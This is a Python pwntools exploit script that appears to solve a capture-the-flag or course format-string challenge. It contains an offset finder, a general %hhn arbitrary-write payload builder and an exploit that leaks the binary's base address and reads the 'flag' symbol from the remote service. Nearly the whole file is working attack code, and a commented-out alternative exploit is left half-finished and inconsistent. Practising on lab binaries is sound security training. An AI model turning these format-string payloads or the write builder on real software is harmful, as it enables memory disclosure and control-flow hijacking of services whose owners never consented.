#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
b main
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
### Format String Helper Functions ###
######################################

def find_offset(after = b':', option = 1):
    for i in range(1, 20):
        connect_binary()


        P.sendlineafter(after, f'AAAABBBB%{i}$p'.encode())

        # leak = P.recvuntil(b'!',drop=True)[14+8:]
        # if leak == b'0x4242424241414141':
        #     if option == 1:
        #         return i
        #     else:
        #         print('{}: {}'.format(i, leak.strip().decode('utf-8')))

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, 'AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        with context.local(log_level='error'):
            P.close()

        if option == 1 and '41414141' in output:
            return i

'''
Format String Builder
---------------------
Accepts target and goal address fields in either int values or p64 - little endian - address formats.
'''
def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'variable @')
    FLAG = P.recvline()[:-21]
    log.info(f"Flag at {FLAG}")
    E.address = int(FLAG, 16) - E.symbols['flag']
    log.info(f"Flag at {hex(E.symbols['flag'])}")
    payload = b''
    payload += p64(E.symbols['flag']) + b'A' * 120 # fill the buffer
    payload += b'%6$s'
    P.sendline(payload)
    P.interactive() # prints the flag

# def exploit():
#     offset = 6 # buffer starts at this address

#     payload = b'A' * 128  # Fill the buffer (adjust if necessary)
#     payload += p64(E.symbols['flag'])  # Place the flag address on the stack
#     payload += f' %{17 + offset}$s'.encode()
#     payload += b'AA' # padding for 8 byte alignment

#     payload= b'A' * 128 + f'%{offset}$n'.encode() + p64(E.symbols['flag'])
#     payload = build_format_string(target=target_address, goal=E.symbols['flag'], offset=offset)
#     build_format_string()

#     P.sendline(payload)
#     P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
